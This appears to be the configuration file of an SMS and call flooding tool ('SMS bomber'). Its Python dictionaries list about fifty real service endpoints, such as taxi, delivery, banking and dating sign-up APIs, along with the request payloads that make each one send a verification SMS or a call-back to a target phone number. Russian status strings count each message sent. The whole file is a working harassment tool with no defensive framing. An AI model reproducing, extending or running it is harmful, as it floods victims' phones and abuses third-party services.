SMS_FLOODS = {
    'https://p.grabtaxi.com/api/passenger/v2/profiles/register':
    {
        'method': 'post',
        'success_text': '[+] Grab отправлено! || Кол-во -',
        'attributes':
        {
            'data': {'phoneNumber': '{_phone}', 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                     'deviceToken': '*'},
            'headers': {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'}
        }
    },

    'https://api.pizza-prosto.ru/P_login_sms':
    {
        'method': 'post',
        'success_text': '[+] PizzaProsto отправлено || Кол-во - ',
        'attributes': 
        {
            'data': {'phone': '{_phone9}'}
        }
    },
    'https://moscow.rutaxi.ru/ajax_keycode.html':
    {
        'method': 'post',
        'success_text': '[+] RuTaxi отправлено! || Кол-во - ',
        'attributes':
        {
            'data': {'l': '{_phone9}'}
        }
    },
    'https://belkacar.ru/get-confirmation-code':
    {
        'method': 'post',
        'success_text': '[+] BelkaCar отправлено! || Кол-во -',
        'attributes':
        {
            'data': {'aj': '50', 'registration-phone': '{_phone}'}
        }
    },
    'https://starpizzacafe.com/mods/a.function.php':
    {
        'method': 'post',
        'success_text': '[+] StarPizzaCafe отправлено! || Кол-во - ',
        'attributes':
        {
            'data': {'aj': '50', 'registration-phone': '{_phone}'}
        }
    },
    'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru':
    {
        'method': 'post',
        'success_text': '[+] Tinder отправлено! || Кол-во - ',
        'attributes':
        {
            'data': {'phone_number': '{_phone}'},
            'headers': {}
        }
    },
    'https://app.karusel.ru/api/v1/phone/':
    {
        'method': 'post',
        'success_text': '[+] Karusel отправлено! || Кол-во - ',
        'attributes':
        {
            'data': {'phone': '{_phone}'},
            'headers': {}
        }
    },
    'https://api.tinkoff.ru/v1/sign_up':
    {
        'method': 'post',
        'success_text': '[+] Tinkoff отправлено! || Кол-во - ',
        'attributes':
        {
            'data': {'phone': '+' + '{_phone}'},
            'headers': {}
        }

    },
    'https://dostavista.ru/backend/send-verification-sms':
    {
        'method': 'post',
        'success_text': '[+] Dostavista отправлено! || Кол-во - ',
        'attributes':
        {
            'data': {"phone": '{_phone}'}
        }
    },
    'https://www.monobank.com.ua/api/mobapplink/send':
    {
        'method': 'post',
        'success_text': '[+] MonoBank отправлено! || Кол-во - ',
        'attributes':
        {
            'data': {"phone": "+" + '{_phone}'}
        }
    },
    'https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32':
    {
        'method': 'get',
        'success_text': '[+] SportMaster отправлено! || Кол-во - ',
        'attributes':
        {
            'data': {"phone": '{_phone}'}
        }
    },
    'https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms': {
        'method': 'post',
        'attributes': {
            "json": {"phone": "+"+"{_phone}"},
        }
    },
    'https://requests.service.banki.ru/form/960/submit': {
        'method': 'get',
        'attributes': {
            "params": {"callback": "submitCallback", "name": "{_name}", "phone": "+"+"{_phone}", "email": "{_email}", "gorod": "Москва", "approving_": "1", },
        }
    },
    'https://api.ivi.ru/mobileapi/user/register/phone/v6': {
        'method': 'post',
        'attributes': {
            "data": {"phone": "{_phone}"},
        }
    },
    'https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/': {
        'method': 'post',
        'attributes': {
            "data": {"RECALL": "Y", "BACK_CALL_PHONE": "{_phone}"},
        }
    },
    'https://city24.ua/personalaccount/account/registration': {
        'method': 'post',
        'attributes': {
            "data": {"PhoneNumber": "{_phone}"},
        }
    },
    'https://koronapay.com/transfers/online/api/users/otps': {
        'method': 'post',
        'attributes': {
            "data": {"phone": "{_phone}"},
        }
    },
    'https://thehive.pro/auth/signup': {
        'method': 'post',
        'attributes': {
            "json": {"phone": "+"+"{_phone}", },
        }
    },
    'https://win.1admiralxxx.ru/api/en/register.json': {
        'method': 'post',
        'attributes': {
            "json": {"mobile": "{_phone}", "bonus": "signup", "agreement": 1, "currency": "RUB", "submit": 1, "email": "", "lang": "en", },
        }
    },
    'https://cabinet.planetakino.ua/service/sms': {
        'method': 'post',
        'attributes': {
            "params": {"phone": "{_phone}"},
        }
    },
    'https://eda.yandex/api/v1/user/request_authentication_code': {
        'method': 'post',
        'attributes': {
            "json": {"phone_number": "+"+"{_phone}"},
        }
    },
    'https://uklon.com.ua/api/v1/account/code/send': {
        'method': 'post',
        'attributes': {
            "json": {"phone": "{_phone}"},
            "headers": {"client_id": "6289de851fc726f887af8d5d7a56c635"},
        }
    },
    'https://www.finam.ru/api/smslocker/sendcode': {
        'method': 'get',
        'attributes': {
            "data": {"phone": "+"+"{_phone}"},
        }
    },
    'https://client-api.sushi-master.ru/api/v1/auth/init': {
        'method': 'post',
        'attributes': {
            "json": {"phone": "{_phone}"},
        }
    },
    'https://auth.multiplex.ua/login': {
        'method': 'post',
        'attributes': {
            "json": {"login": "{_phone}"},
        }
    },
    'https://ube.pmsm.org.ru/esb/iqos-phone/validate': {
        'method': 'post',
        'attributes': {
            "json": {"phone": "{_phone}"},
        }
    },
    'https://api.kinoland.com.ua/api/v1/service/send-sms': {
        'method': 'post',
        'attributes': {
            "json": {"Phone": "{_phone}", "Type": 1},
            "headers": {"Agent": "website"},
        }
    },
    'https://alfalife.cc/auth.php': {
        'method': 'post',
        'attributes': {
            "data": {"phone": "{_phone}"},
        }
    },
    'https://kasta.ua/api/v2/login/': {
        'method': 'post',
        'attributes': {
            "data": {"phone": "{_phone}"},
        }
    },
    'https://shop.vsk.ru/ajax/auth/postSms/': {
        'method': 'post',
        'attributes': {
            "data": {"phone": "{_phone}"},
        }
    },
    'https://widgets.binotel.com/getcall/call/': {
        'method': 'post',
        'attributes': {
        }
    },
    'https://passport.twitch.tv/register?trusted_request=true': {
        'method': 'post',
        'attributes': {
            "json": {"birthday": {"day": 11, "month": 11, "year": 1999}, "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True, "password": 'password', "phone_number": "{_phone}", "username": 'username'},
        }
    },
    'https://helsi.me/api/healthy/accounts/login': {
        'method': 'post',
        'attributes': {
            "json": {"phone": "{_phone}", "platform": "PISWeb"},
        }
    },
    'https://btfair.site/api/user/phone/code': {
        'method': 'post',
        'attributes': {
            "json": {"phone": "+"+"{_phone}", },
        }
    },
    'https://smart.space/api/users/request_confirmation_code/': {
        'method': 'post',
        'attributes': {
            "json": {"mobile": "+"+"{_phone}", "action": "confirm_mobile"},
        }
    },
    'https://www.delivery-club.ru/ajax/user_otp': {
        'method': 'post',
        'attributes': {
            "data": {"phone": "{_phone}"},
        }
    },
    'https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code': {
        'method': 'post',
        'attributes': {
            "params": {"msisdn": "{_phone}"},
        }
    },
    'https://www.moyo.ua/identity/registration': {
        'method': 'post',
        'attributes': {
            "data": {"firstname": "{_name}", "phone": "{_phone}", "email": "{_email}"},
        }
    },
    'https://account.my.games/signup_send_sms/': {
        'method': 'post',
        'attributes': {
            "data": {"phone": "{_phone}"},
        }
    },
    'https://www.ozon.ru/api/composer-api.bx/_action/fastEntry': {
        'method': 'post',
        'attributes': {
            "json": {"phone": "{_phone}", "otpId": 0},
        }
    },
    'https://ggbet.ru/api/auth/register-with-phone': {
        'method': 'post',
        'attributes': {
            "data": {"phone": "+"+"{_phone}", "login": "{_email}", "password": 'password', "agreement": "on", "oferta": "on", },
        }
    },
    'https://fix-price.ru/ajax/register_phone_code.php': {
        'method': 'post',
        'attributes': {
            "data": {"register_call": "Y", "action": "getCode", "phone": "+"+"{_phone}"},
        }
    },
    'https://api.chef.yandex/api/v2/auth/sms': {
        'method': 'post',
        'attributes': {
            "json": {"phone": "{_phone}"},
        }
    },
    'https://www.niyama.ru/ajax/sendSMS.php': {
        'method': 'post',
        'attributes': {
            "data": {"REGISTER[PERSONAL_PHONE]": "{_phone}", "code": "", "sendsms": "", },
        }
    },
    'https://api.easypay.ua/api/auth/register': {
        'method': 'post',
        'attributes': {
            "json": {"phone": "{_phone}", "password": "{_password}"},
        }
    },
    'https://secure.online.ua/ajax/check_phone/': {
        'method': 'post',
        'attributes': {
            "params": {"reg_phone}": "{_phone}"},
        }
    },
    'https://plink.tech/register/': {
        'method': 'post',
        'attributes': {
            "json": {"phone": "{_phone}"},
        }
    },
    'https://msk.tele2.ru/api/validation/number/': {
        'method': 'post',
        'attributes': {
            "json": {"sender": "Tele2"},
        }
    },
}

CALL_FLOODS = {
    'https://my.zadarma.com/connect/':
    {
        'method': 'post',
        'success_text': '[+] zadarma звонок отправлен!',
        'failure_text': '[-] Не удалось отправить запрос на звонок! (zadarma) ',
        'attributes':
        {
            'params': {"?number=": '+' + '{_phone}'}
        }
    },
    'https://findclone.ru/register':
    {
        'method': 'get',
        'success_text': '[+] findclone звонок отправлен!',
        'failure_text': '[-] Не удалось отправить запрос на звонок! (findclone)',
        'attributes':
        {
            'params': {'phone': '+' + '{_phone}'}
        }
    },
    'https://msk.dostaevsky.ru/ajax/feedback/':
    {
        'method': 'post',
        'success_text': '[+] dostaevsky звонок отправлен!',
        'failure_text': '[-] Не удалось отправить запрос на звонок! (dostaevsky)',
        'attributes':
        {
            'params': {"back_call": '+' + '{_phone}'}
        }
    }
}
